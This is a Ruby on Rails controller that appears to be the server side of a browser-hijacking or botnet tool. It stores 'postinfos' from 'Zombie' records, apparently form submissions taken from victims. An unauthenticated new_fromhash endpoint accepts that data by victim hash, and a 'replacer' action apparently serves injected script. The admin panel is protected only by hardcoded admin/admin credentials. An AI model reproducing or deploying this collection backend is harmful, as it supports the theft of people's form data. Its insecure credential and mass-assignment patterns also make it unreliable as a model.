class PostinfosController < ApplicationController
http_basic_authenticate_with :name => "admin", :password => "admin", :except => [:new_fromhash]
  # GET /postinfos
  # GET /postinfos.json
  def index
    @postinfos = Postinfo.all

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @postinfos }
    end
  end
	def replacer
		render(:layout => false)
	end
  
    def new_fromhash
    @zombie = Zombie.where(:hashid => params[:hashid]).first
	@postinfo = @zombie.postinfos.create(params[:postinfo])
    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @cookie }
    end
  end
  
  # GET /postinfos/1
  # GET /postinfos/1.json
  def show
    @postinfo = Postinfo.find(params[:id])

    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @postinfo }
    end
  end

  # GET /postinfos/new
  # GET /postinfos/new.json
  def new
    @postinfo = Postinfo.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @postinfo }
    end
  end

  # GET /postinfos/1/edit
  def edit
    @postinfo = Postinfo.find(params[:id])
  end

  # POST /postinfos
  # POST /postinfos.json
  def create
    @zombie = Zombie.find(params[:zombie_id])
    @postinfo = @zombie.postinfos.create(params[:postinfo])

    respond_to do |format|
      if @postinfo.save
        format.html { redirect_to @zombie, notice: 'Postinfo was successfully created.' }
        format.json { render json: @postinfo, status: :created, location: @postinfo }
      else
        format.html { render action: "new" }
        format.json { render json: @postinfo.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /postinfos/1
  # DELETE /postinfos/1.json
  def destroy
    @postinfo = Postinfo.find(params[:id])
    @postinfo.destroy

    respond_to do |format|
      format.html { redirect_to postinfos_url }
      format.json { head :no_content }
    end
  end

  	def removeall
	  Postinfo.delete_all
	  flash[:notice] = "You have removed all post info!"
	  redirect_to zombies_path
	end
  
  end
